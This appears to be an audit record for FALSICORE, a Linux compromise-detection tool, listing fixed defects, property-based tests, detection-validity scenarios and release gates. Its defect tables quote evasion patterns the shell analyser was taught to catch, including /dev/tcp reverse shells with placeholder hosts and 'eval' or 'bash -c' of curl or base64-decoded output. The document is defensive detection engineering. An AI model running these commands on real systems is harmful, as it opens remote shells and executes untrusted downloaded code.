# FALSICORE audit record (0.1.3 → 0.2.0)

Sections dated 0.2.0 (property-based testing, detection validity, package
managers, cross-view consistency, offline mode, mutation testing) extend the
0.1.3 record below; every refuted claim is kept with its disposition. The
0.1.3 part covers the 0.1.2 → 0.1.3 repair. Three read-only review passes ran
as separate agents. Each had its own scope: A, execution and subprocess
lifecycle; B, collection, parsing and attribution; C, verdicts, privacy,
reporting and packaging. Every review drew on the same model family, so this is
**not** an independent third-party assessment. One integrator made every change.

Baseline: 0.1.2 source (commit `b0d80e8`) on Ubuntu 24.04.4, Python 3.12.3,
UID 1000. On that host the suite ran 431 tests: 427 passed and 4 failed. The
4 failures are D1 below. The release claim of "431/431" had been measured on
Debian 13 / Python 3.13.5 and did not reproduce on this host.

## Defect register

Status `FIXED` means a regression test exists, it fails when the fix is
removed (see *Fault injection*), and the full suite passes. Line references
point to 0.1.3 code.

| ID | Where | Violated invariant / impact | Fix | Test |
|---|---|---|---|---|
| D1 | tests (`test_final_hardening`, `test_v32_assurance`, `test_interrupt_cleanup`) | Child interpreters were started without `-I`. On a host with non-ASCII `.pth` files, the 4 lifecycle tests failed. Worse, the "grandchild holds the pipe" test passed **vacuously**, because the grandchild crashed at start-up. | `-I` for every disposable child interpreter | the same tests; mutant D1 |
| A-1 | `monitor.py` | `systemctl --user` ran in the minimal probe environment, so enable/status could never reach the user bus. `enable` wrote unit files before it failed. | `user_bus_env()`: XDG runtime directory only if private to this UID; preflight before writing | `test_monitor_env.py` |
| A-2 | `cli.py`, `bundle.py` | No progress for up to 97 s (scan) or 180 s (self-test). | `Progress` on stderr: phase, `[i/N]`, 10 s heartbeat. Self-test heartbeat and failure reason. | `test_progress.py` |
| A-3, B-10 | `cli.py` `Progress`, `collectors.py` `scan` | A closed stderr redirected progress to stdout, or a broken pipe aborted the whole scan. | `stream=None` turns progress off; an OSError disables it; the collector isolates callback errors | `ProgressFailureIsolationTests` |
| A-4 | `cli.py` scan | Ctrl-C ended in a raw traceback and left an unexplained empty run folder. | `SCAN CANCELLED`, run path printed, exit 130; owned probe groups are killed | `test_keyboard_interrupt_returns_130_with_run_path`; live SIGINT run (below) |
| A-5, A-6 | `safety.py` `_run_bounded` | A daemonised grandchild survived a `COMPLETED` probe. The leader was reaped before `killpg`, so its PID or group could be reused. | The leader is observed with `waitid(WNOWAIT)` and never reaped before the final `killpg`; residual members are reported | `test_executor_lifecycle.py` |
| A-7 | `safety.py` | A death by signal could not be told apart from exit 1. An escaped pipe holder went unlabelled. | `error="signal:SIGSEGV"`; `PIPE_HOLDER_OUTSIDE_GROUP` | same |
| A-8 | `collectors.py` `scan` | The whole-scan deadline was cooperative. A blocking read inside a collector (a FIFO, a hung filesystem) was never interrupted, so the scan could hang past its budget. | **Fixed in 0.2.0.** A one-shot `SIGALRM` armed at budget + grace (5 %, ≥2 s) raises `DeadlineExpired` inside the running collector only; the collector becomes `FAILED/BUDGET_EXHAUSTED` with its observations rolled back, later collectors are `SKIPPED`, the timer is disarmed and the previous handler restored. The executor's cleanup runs under `deferred_alarm()` so a probe group is always killed and reaped. Outside the main thread the scan records `hard_deadline.armed=false` and keeps the cooperative budget. | `test_hard_deadline.py` (FIFO-blocked collector; alarm during a live probe) |
| A-9 | `safety.py` | stderr was merged into the parsed stdout: journalctl hints were miscounted as malformed, bus errors were shown as a status. | Separate bounded stderr (64 KiB), never parsed as data | `test_stderr_is_separate_from_parsed_stdout` |
| B-1 | `collectors.py` `processes` | Exposure records kept only the PID, so after the process exited (an observed browser process in the originating incident) it could not be identified. | A pinned `/proc/<pid>` dirfd. Observations capture PID, PPID, UID, `start_ticks` (stat field 22), `boot_id`, executable name, dev:ino, mode, owner, bounded SHA-256, and the parent's start time and name. | `LiveProcessAttribution` (disposable `/tmp` copy of `sleep`) |
| B-2 | `processes` | A cmdline longer than 8 KiB lost its flags with no record, and the scan reported clean. | 64 KiB bound; overflow counts as `INPUT_TRUNCATED` → PARTIAL | `test_truncated_cmdline_is_incompleteness_not_clean` |
| B-3 | `detectors.browser_flag_review` | `--remote-debugging-pipe` was merged with network weakening. | Sandbox, trust, pipe and port are now separate. A port is checked against observed listeners (`LISTENING_LOOPBACK_ONLY`, `…_BEYOND_LOOPBACK`, `NOT_OBSERVED`, `UNKNOWN`). | `BrowserFlagSemantics` |
| B-4 | `_scan_chromium`, `_scan_firefox` | Extensions appeared only as an opaque hash, so the operator had to dig by hand. Disabled Chromium extensions were reported as active. | Identity block: ID, resolved name, version, profile ref, enabled (or `UNKNOWN`), granted vs declared permissions, content-script matches, install location, Web Store / signature state, linked native hosts | `ChromiumIdentity`, `FirefoxAndNativeHosts` |
| B-5 | `_native_hosts` | The evidence was only a hash. The home-prefix test also matched `/home/userx`. | Host name, allowed extensions, manifest owner, executable metadata and hash; the prefix ends in `/` | `test_native_host_links_and_home_prefix_boundary` |
| B-6 | `shell_syntax.py` | False negatives were reported with no limitation, i.e. as clean: functions, braces, `timeout`/`nice`/`xargs`, `alias`, `PROMPT_COMMAND`, `trap`, `< file`, `2>` operands, `<(curl)`, `curl \| python3`, `perl`/`node` scripts. | A quote-aware lexer with comment, substitution, redirection and here-doc handling; a wrapper set; command-valued settings; stdin interpreters | `test_shell_adversarial.py` (41 cases) |
| B-7 | `shell_syntax.py` | A trailing backslash inside a comment, or `\\`, joined the next line, which then disappeared into the comment. This is an evasion. | Continuation is decided by the lexer, not by text before lexing | `comment_*_does_not_continue` |
| B-8 | `shell_syntax.py` | Data inside a multi-line string was classified as a command. | Multi-line quoting is lexed as one word | `multiline_*_data` |
| B-9, C-2 | `collectors.py` `checked` | Coverage gave only a status and free text. | A closed vocabulary: `reason_codes` (incompleteness) and `scope_limits`. `PARTIAL` requires a reason; `COMPLETED` forbids one. | `CoverageVocabulary` |
| C-1 | verdict | `NO_COMPROMISE_INDICATORS_OBSERVED` could never be reached: inherent scope limits counted as incompleteness. | Scope limits (other accounts, system scope, profile depth, package-attested syntax) are reported but do not make a defined target incomplete | `test_verdict_reachable_when_only_scope_limits_remain` |
| B-11 | `_scan_chromium` | Only `Default` and `Profile N` were inspected. Custom-named profiles, which this host has, were never looked at. | Any profile folder with `Preferences` or `Extensions` | `test_custom_named_profile_and_full_identity` |
| B-12 | `persistence` | `/usr/lib/systemd/user` was not an inspected root, so links into it went unseen (42 gaps on this host). | Vendor user units added; symlinks are covered when their target lies inside an inspected root | `test_vendor_user_units_are_inspected_roots` |
| B-13 | `persistence` | Cron and autostart parse limits were discarded. Files sourced from `.bashrc` were never analysed. | Limits are surfaced. Sourced files are followed (home and non-attested; max 24). Root-owned files identical to their dpkg record count as `PACKAGE_ATTESTED_NOT_PARSED` (a stated trust assumption). | `ShellFollowAndAttestation`, `PersistenceFixtures` |
| C-3, C-4 | `report.py`, `cli.py`, `guide.py` | No Ukrainian per-finding explanation; the terminal did not show exposures at all. | `guide.RULES` gives each rule an observation, benign alternatives, uncertainty, P1–P3 and a non-destructive step. The terminal shows them all. | `GuideCompleteness`, CLI tests |
| C-5 | `report.py` | An edited baseline with recomputed hashes verified as genuine, and the comparison was labelled "VERIFIED". | The baseline is bound into the analysis digest; the status is renamed `LOCAL_CONSISTENT_COMPARISON` | `test_baseline_tamper_with_recomputed_manifest_is_rejected` |
| C-6 | `cli.py` | An incompatible `--compare` failed only after the full scan, with an English message that did not say why. | Preflight before collection that names the differing fields; auto-compare reports how many baselines it skipped and why | `test_incompatible_compare_is_refused_before_collection` |
| C-7 | `collectors.py`, `report.py` | PIDs were part of the finding hash, so IDs changed on every scan. | Per-run attribution moves to `observations`, which are excluded from IDs and the digest; the source is the executable path | `test_finding_id_is_independent_of_pid` (live), `test_identical_findings_merge…` |
| C-8 | `report.py`, `guide.py` | Markdown and terminal output passed HTML and C0/C1/bidi controls through. | `terminal_safe` plus entity escaping | `test_markdown_neutralises…`, explain test |
| C-9 | `report.py` | Markdown silently cut findings at 350. | An explicit "… ще N" marker | `test_markdown_marks_omitted_findings` |
| C-10 | `tools/build_release.py` | The ZIP prefix came from the checkout folder name. | `falsicore-<version>/` | `test_archive_bytes_do_not_depend_on_checkout_folder_name` |
| C-11 | workflows, `Makefile` | No full-ZIP build; builds rewrote `SOURCE_MANIFEST`; CodeQL was unpinned. | `tools/build_full.py` (one deterministic full ZIP, hash kept outside it); builds never edit the tree; `--check-manifest` in CI; CodeQL pinned to the commit of v4.39.1, resolved through the GitHub API | `test_full_distribution.py` |
| C-12 | docs | Stale claims (431/431, "one Python file", "select a license"). | Rewritten or removed (this release) | review |
| C-13 | — | No progress on stderr | see A-2 | — |
| R-1 | full ZIP / `START_HERE_UA.md` | Found by clean-extraction verification: Python's `zipfile` extractor does not restore the execute bit, so `./run.sh` is refused (`unzip` keeps it). | The operator command is `bash run.sh`, which works with any extractor | clean-extraction receipt |
| R-2 | tests (`test_failure_paths`, `test_review_regressions`) | Found by the packaged self-test: two new fixtures passed only while `TMPDIR` was outside `/tmp`. With fixtures under `/tmp` (self-test minimal env, CI) the temp-path rule masked the property under test. | Each test isolates its rule by patching the volatile-prefix table; the suite passes with `TMPDIR=/tmp`, with a home-based `TMPDIR`, and in a minimal environment | same tests |
| R-3 | tests (`test_assurance01`, `test_v3_engineering`) | Found by hosted CI (run 40597331933): four older monitor tests mocked `run_command` but not the new A-1 runtime-directory preflight. They passed only on hosts with a login session (`/run/user/<uid>`). | The preflight is patched in those test classes and covered on its own in `test_monitor_env.py`; reproduced locally with the runtime base pointed at a missing directory | same tests |
| R-4 | `tests/test_executor_lifecycle.py` | Found by hosted CI (run 40643424328, Python 3.12 job): the signal-label test used SIGSEGV. The runner's core-dump handler outlasted the 3 s deadline, so the probe was killed by the timeout (`-9`). The executor behaved correctly; the fixture was environment-dependent. | SIGTERM (no core dump) exercises the same contract | same test |
| R-5 | `tests/test_monitor_env.py` | CodeQL `py/overly-permissive-file` flagged the fixture `chmod` (modes `0o755`, `0o750` and `0o701` were each flagged in turn). | The fixture no longer loosens permissions on disk: the shared modes are supplied through `lstat`, and the same refusal is tested for all three | same test |
| R-6 | `bundle.py` main | Found while running the delivered tool: `bash run.sh --profile deep` (as documented) failed with an argparse error, because the portable entry applied the default `scan` only when there were no arguments. | Leading options imply a default user-scope `scan`; explicit actions are unchanged | `test_launcher_options_default_to_user_scan` |
| R-7 | `collectors.py` packages, `detectors.dpkg_verify_review` | Found on the host deep scan: every `dpkg --verify` line was counted as "changed". 15 763 records were reported as drift, but they were 15 729 missing files (modules of two removed kernels), 25 files unreadable without root, and 9 changed conffiles. | Lines are classified by the md5 column and the conffile marker: non-config content change → `DPKG_FILE_DRIFT` (INDICATOR, P1); conffile change → `DPKG_CONFFILE_CHANGED` (CONTEXT); missing → `DPKG_FILES_MISSING` (CONTEXT, path prefixes); unverifiable → scope limit (user) or `PERMISSION_DENIED` (system) | `test_dpkg_verify_line_classes`, `test_missing_files_are_context_not_drift`, system-scope tests |
| R-8 | `detectors.dpkg_verify_review` | Found on the host deep scan after R-7: 36 lines of the form `missing <path> (Permission denied)` were counted as missing files under the prefix `/denied)`. | These lines are now classified as unverifiable (a user-scope limit) | `test_dpkg_verify_line_classes` |
| R-10 | `tools/build_release.py`, CI | Found on Dependabot PR #1: `SOURCE_MANIFEST.sha256` also hashed `.github/` workflows, so every automated workflow update failed CI (manifest stale), and dependency updates could never land unattended. | Workflows are excluded from the source manifest and the portable app. They ship in the full ZIP's `source/` tree, covered by `SHA256SUMS`. Weekly scheduled CI added. | `test_workflow_changes_do_not_invalidate_source_manifest` |
| L-1 | `cli.py` explain/verify | A 0.1.2 (schema v3) report was rejected as "integrity failed". | Detected as `LEGACY`: file hashes are checked, semantics are not re-derived, and it is never compared with new reports | `LegacyReports` |

## Property-based testing (0.2.0)

`tests/test_properties.py` states universally quantified claims with
Hypothesis (development dependency; the shipped tool stays standard-library).
CI runs them with `FALSICORE_REQUIRE_HYPOTHESIS=1`, so an absent library is a
failure, never a skip. Writing the properties refuted five existing behaviours
**before** any random example was drawn; two more were found by Hypothesis.
Each counterexample is kept as a plain unittest in
`tests/test_property_regressions.py`, so the packaged self-test guards it
without Hypothesis.

| ID | Where | Refuted claim / impact | Found by | Fix |
|---|---|---|---|---|
| P-1 | `shell_syntax._run` | NUL is the analyser's private marker byte. A start-up file containing `\x00PROCSUBzz\x00` raised `ValueError` inside `analyze`, the collector raised, and the whole `persistence` check became `FAILED` with its observations discarded: attacker-controlled content could blank a check. | stating totality | NUL bytes are removed before lexing and reported as `NUL_IN_INPUT` (→ `PARSE_UNSUPPORTED`), so input can never forge a marker |
| P-2 | `shell_syntax._run` | A comment ending in a backslash (`# note \`) was reported as `INCOMPLETE_CONTINUATION`, turning a complete check into `PARTIAL`. `echo a \ b` (escaped space) was flagged too. | stating "a comment is inert" | continuation is decided in lexer state: only a bare trailing backslash outside comments and quotes |
| P-3 | `report.stable_findings` | Not idempotent: a second pass changed every finding ID (`observations_omitted` had entered the canonical form) and reset the omitted count to 0. | stating idempotence | `observations_omitted` is run metadata, excluded from identity; omitted counts accumulate across merged duplicates. Digests of 0.1.3 reports are unchanged. |
| P-4 | `report._analysis_digest` | Coverage rows were sorted by `(check, status)` only; rows that tied kept enumeration order, so the digest was not order-independent. | Hypothesis, shrunk to two tied rows | total order over the serialised row. Real scans have unique check names, so earlier digests are unchanged. |
| P-5 | `shell_syntax._Analysis.command` | A program whose basename is a reserved word (`/tmp/done`, `/tmp/in`) was treated as the keyword and skipped, escaping `TEMP_PATH_IN_EXECUTION`. | Hypothesis (`/tmp/in --arg`) | only a bare, unquoted word is a reserved word |
| P-6 | `guide.identity_line` | Non-dict `evidence` or non-dict first observation raised `AttributeError` in `explain`. | stating totality | defensive type checks; returns an empty line |
| P-1b | `shell_syntax.analyze` | Regression of the P-1 fix, caught before release by the evasion probe: NUL stripping ran inside every nested run, so `eval "$(curl …)"` (whose nested text legitimately carries lexer markers) reported `NUL_IN_INPUT`. | probing evasion variants | NUL is stripped at the public entry only |
| P-8 | `shell_syntax._Analysis` | `eval "$(curl …)"`, `sh -c "$(curl …)"`, `python3 -c "$(curl …)"`, `PROMPT_COMMAND="$(curl …)"` and `bash -c "$(… \| base64 -d)"` produced only a limitation and no pattern: code that arrives through a substitution was not attributed to its source. | probing evasion variants | the source classes emitted by a command's own substitutions feed `_code_from` for eval, `-c` and inline interpreter code |
| P-9 | `shell_syntax._Analysis` | Reverse shells through `/dev/tcp` (`bash -i >& /dev/tcp/H/P 0>&1`, `exec 3<>/dev/tcp/H/P`) were invisible: `exec` leaves no command word to classify. | probing evasion variants | `NETWORK_REDIRECTION` on any redirection target under `/dev/tcp/` or `/dev/udp/`, checked before wrappers are stripped |
| P-10 | `shell_syntax._head` | Hypothesis, in the gate of a later pull request: `/tmp/if --arg` produced no pattern. The transparent-wrapper set was matched by basename, so a program named like a reserved word (`if`, `then`, `do`, …) or like a wrapper (`/tmp/nohup`) was stripped as if it were the keyword and never classified. The sibling of P-5 for the other keyword set. | Hypothesis (`test_volatile_executable_is_seen_through_transparent_wrappers`) | reserved words are transparent only as bare words; a wrapper that itself lives in a volatile path is the program to report |
| P-7 | mypy | 10 type errors were "informational" (`RELEASE_EVIDENCE.json`). Two were real: `install_location`/`signed_state` lookups passed arbitrary JSON values to integer-keyed tables. | `mypy --check-untyped-defs` | typed `Profile`, narrowed lookups; mypy is a CI gate (zero errors) |

Model refinements recorded as negative results (not product defects): the cron
and `.desktop` adapters split on `str.splitlines()`, which also breaks on
`\x0c`, `\x1c`–`\x1e`, `\x85`, U+2028/9. Cron itself breaks only on `\n`.
No evasion follows (both halves are still analysed), so the single-line model
excludes those characters instead of changing the adapters.

## Detection validity (0.2.0)

`tools/validity.py` builds a hermetic fixture host per scenario (own root,
home and `/proc`; probe commands answered from canned text through the same
read-only policy), plants one artifact shape, runs a full deep scan and
records whether the targeted rule fired. Each shape has a benign twin that
must stay silent. The unplanted host reaches `NO_COMPROMISE_INDICATORS_OBSERVED`
in both scopes, so a silent twin is a measurement and not an artefact of an
inconclusive baseline. The table lives in `docs/DETECTION_VALIDITY.json`; CI
fails when it is stale (`--check`). This measures recall on synthetic
artifact shapes and false alarms on their twins: it says nothing about real
malware, about shapes not listed, or about the live host.

The first run refuted two scenarios; both are kept as negative results:

| ID | Scenario | Cause | Disposition |
|---|---|---|---|
| V-1 | `volatile_process_with_public_connection` | The fixture used RFC 5737 documentation addresses (198.51.100.x), which `ipaddress` classifies as private, so `TEMP_PROCESS_PUBLIC_EGRESS` could never fire. | fixture defect: scenarios use globally routable addresses (never contacted) |
| V-2 | `native_host_in_home` | Under an injected root the collector compared the manifest's path (`/home/u/...`, the inspected system's own name) with the host-prefixed home. The same mismatch applies to `source /etc/...` operands. | product defect for root injection: manifest paths and absolute `source` operands are resolved as image paths (`image_path`, `sys`); live-host behaviour unchanged |

Known gaps are listed as such and never counted: a relative program after
`cd`, a download bound to a variable before `eval`.

The harness paid for itself again when the package collector was generalised
(0.2.0, `falsicore/packages.py`):

| ID | Scenario | Cause | Disposition |
|---|---|---|---|
| V-3 | every pacman and apk scenario | `safe_read` refuses a bound above 8 MiB; the new verification passed 64 MiB (files) and 128 MiB (apk database), so the whole `packages` collector raised and was rolled back to `FAILED/COLLECTOR_ERROR` — on every Arch and Alpine host. | bounds set to `safe_read`'s ceiling; larger files count as unverifiable; the scenarios now pass |

Cross-view consistency (`crossview`, 0.2.0) adds four rules whose positive
scenarios plant a readdir-hidden process, a lookup-hidden process, a module
live only in sysfs, a listener visible in one socket view only, and a mount
over `/proc/<pid>`; benign twins plant thread IDs, a built-in module, a
listener in both views and the standard `binfmt_misc` mount. Report schema
is `falsicore.summary.v5`; v4 reports are read as LEGACY because the essential
set and the rule names changed.

| ID | Where | Refuted claim / impact | Found by | Fix |
|---|---|---|---|---|
| CV-1 | `collectors.crossview` | On every live host the check was `PARTIAL` (`READ_FAILED`, `SYMLINK_NOT_FOLLOWED`): `/proc/self` and `/proc/net` are symlinks, which the no-follow reader refuses by design, so mount overlays and `/proc/net` listeners were never read. The fixture hosts have a real `self` directory and could not show it. | the first 0.2.0 scan of a real host | read `/proc/<own pid>/mountinfo` and `/proc/<own pid>/net/*` on a live host; a live test asserts both reads succeed without a gap |

| ID | Where | Refuted claim / impact | Found by | Fix |
|---|---|---|---|---|
| D-2 | `collectors.persistence`, `shell_syntax` | `NO_COMPROMISE_INDICATORS_OBSERVED` was unreachable on a stock Ubuntu desktop: the default `~/.bashrc` evaluates `dircolors` and `lesspipe` output, every such line was `PARSE_UNSUPPORTED`, `persistence` was `PARTIAL`, the verdict `INCONCLUSIVE` (both 0.1.3 host runs and both 0.2.0 host runs). A tool whose verdict cannot be reached on its primary platform says nothing by its silence. | the maintainer-host scans | the analyser reports the literal programs whose output an `eval` executes and the number of unresolved sites; when they coincide and every program is package-attested and not a relay, the file carries the scope limit `EVAL_OF_ATTESTED_PROGRAM_OUTPUT` (a stated trust assumption, like `PACKAGE_ATTESTED_NOT_PARSED`). Refuted by: a relay program, an unattested program, a download/decode, a variable in between or any second limitation turning the file `COMPLETED` (tests, validity twins). |

Offline image mode (0.2.0, `--root`): the live-only collectors are declared
`SKIPPED/LIVE_ONLY_NOT_IN_OFFLINE_IMAGE` and leave the essential set; every
probe but the image's own journal is refused as a scope limit; the harness
runs a third clean host (offline) and three offline scenarios, one of which
plants a volatile process, a hidden PID and an exposed listener in the
fixture's live views and requires them to stay unreported for an image.

No site is special-cased (0.2.0): the browser-extension assessment used to
single out Instagram hosts (`instagram_access_potential`,
`content_script_instagram_access`), a remnant of the originating incident.
It now reports `host_scope` and `content_script_scope` from the match-pattern
grammar (`all_urls` > `wildcard_domains` > `specific` > `none`); `risk_flag`
is a sensitive API together with any host access, a content script on broad
hosts, the debugger API or native messaging. A content script on one named
site without any API is no longer flagged (it was, for one site only).
The grammar function (`grants_host_access`) and its substring-evasion tests
(`fakeexample.com`, `example.com.evil`) are unchanged in substance.

Rule renames in 0.2.0 (one rule per observation, the manager is evidence):
`DPKG_FILE_DRIFT` → `PACKAGE_FILE_DRIFT`, `DPKG_CONFFILE_CHANGED` →
`PACKAGE_CONFFILE_CHANGED`, `DPKG_FILES_MISSING` → `PACKAGE_FILES_MISSING`,
`INSECURE_APT_REPOSITORY_SETTING` → `INSECURE_PACKAGE_SOURCE_SETTING`; new
`PACKAGE_METADATA_DRIFT`. `rule_set_version` follows the tool version, so
baselines across the rename are refused, never compared.

## Fault injection (targeted mutation)

The script `.falsicore-audit/mutation.py` (private, not shipped) copies the
tree, removes one protection, and runs the relevant test module. Result:
**25 of 25 mutants were killed** (`.falsicore-audit/mutation_results.json`).
This was targeted, not whole-project mutation testing. Two caveats:

- The A-4 mutant was killed because the runner aborted, not by an assertion.
- The D1 mutant is killed only on hosts with non-ASCII `.pth` files.

## Methodology mapping

These are adopted practices. No compliance or certification is claimed.

| Source | Concrete requirement adopted | Where tested |
|---|---|---|
| NIST SP 800-218 (SSDF) PW.7, PW.8 | Review code and test executable code before release; keep the results | review passes A/B/C; full suite; coverage; mutation |
| SSDF PS.2, PS.3 | Release integrity information; archive each release | `SOURCE_MANIFEST.sha256`, `SHA256SUMS`, external ZIP hash, two byte-identical builds |
| SSDF RV.1, RV.2 | Collect, analyse and fix vulnerabilities with regression tests | defect register above |
| Microsoft SDL: threat modelling, static analysis, dependency review | Threat model is updated; bandit and ruff checks; CodeQL pinned; no runtime dependencies | `docs/THREAT_MODEL.md`, `verify.yml` static-analysis job |
| Google review guide ("Looking for"): tests, naming, complexity, documentation | Every fix has a test; comments state invariants; no new abstraction without need | review |
| Claude Code permissions / sandboxing docs | The agent works as UID 1000 with no sudo; no privileged scan was performed | G1/G11 below |

## Gates

| Gate | Status | Evidence / limit |
|---|---|---|
| G1 host and user work preserved | PASS | Writes were limited to: the repository working copy; new private run folders (`~/falsicore-runs/run-*` and the agent scratch folder); `.falsicore-audit/`; disposable `/tmp/fc-attr-*` test copies, which are removed after each test. Nothing was deleted from `~/falsicore-runs`. There was no browser, shell, service, package or extension change. |
| G2 release-blocking defects fixed | PASS | B-1, B-4, B-6 and every major finding above. A-8 was a documented limitation in 0.1.3 and is fixed in 0.2.0. |
| G3 complete retained suite passes | PASS | 548 discovered / 548 passed / 0 failed / 0 errors / 0 skipped. All 24 baseline test files are kept; 31 now. |
| G4 positive/negative/failure tests for changed logic | PASS | per-row tests; `test_failure_paths.py` |
| G5 progress, cancellation, deadlines via real launcher | PASS | `./run.sh` progress and heartbeat. Live SIGINT during `dpkg --verify` (a deep profile run under this account): the scan exited 40 ms later, the owned `dpkg` child was killed, exit 130. |
| G6 attribution retained | PASS | Live test with a disposable process. A historical PID from a 0.1.2 run **cannot** be reconstructed: 0.1.2 did not record it. |
| G7 reports consistent, escaped, private | PASS | 0700/0600; CSP; escaping tests; baseline-tamper test |
| G8 reproducibility | PASS (same environment only) | Two pyz builds and two full ZIP builds are byte-identical on this host. No cross-platform claim. |
| G9 clean-extraction verification | see release receipt next to the ZIP | |
| G10 authorised local workflow exercised | PASS (user scope) | 0.1.3: standard and deep user-scope runs. 0.2.0: standard (7.0 s) and deep (75.6 s) user-scope runs of the maintainer host after CV-1; all nine checks `COMPLETED` except `persistence` `PARTIAL` (`PARSE_UNSUPPORTED`×5 from `eval "$(…)"` lines of the stock shell start-up, see D-2), hence `INCONCLUSIVE`; 20 exposures (browser native hosts, policies), 2 context findings (dpkg conffiles, missing files), 0 indicators; offline mode exercised on fixture images only |
| G11 unperformed checks identified | PASS | no system-scope run (no authorisation); hosted CI: the first run on the pushed commit failed (R-3) and is kept as a negative result; the run on the fix is recorded in the release receipt; coverage 89% < 100% target; no malware-corpus validation |

## Coverage

Branch-aware coverage of runtime package `falsicore/`, with no exclusions:

- statements: 3047, of which 2775 covered;
- branches: 1388, of which 1192 covered;
- overall: **89%**.

Weakest module: `guide.py` (67%, rendering branches for rare evidence shapes),
then `monitor.py` (81%) and `collectors.py` / `safety.py` (86%). Missing lines
are listed by `coverage report -m`, and the CI gate is 88% (previously 86%).
The 100% target was **not reached**. Coverage measures exercised code, not
detection accuracy.

## Limitations that remain

- Heuristic detectors; no validation against a real malware corpus.
- A live scan trusts the running kernel. A root or kernel adversary can forge
  every observation, the dpkg md5 records included.
- The shell lexer is a deliberate subset. Unresolved program identity is
  reported as `PARSE_UNSUPPORTED`, never guessed.
- User scope cannot see other accounts' processes or sockets, root-only files,
  or non-dumpable processes of its own account. These appear as scope limits.
- The hard deadline (A-8) works in the main thread only; a scan driven from
  another thread keeps the cooperative budget and says so in `stats.hard_deadline`.
